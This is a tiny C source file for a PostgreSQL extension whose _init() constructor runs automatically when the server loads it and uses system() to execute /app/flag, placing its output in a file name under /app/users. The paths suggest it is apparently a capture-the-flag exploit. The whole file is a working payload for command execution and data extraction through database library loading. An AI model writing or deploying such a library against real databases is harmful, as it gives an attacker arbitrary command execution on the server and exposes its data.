#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
	system("touch /app/users/$(/app/flag).json");
}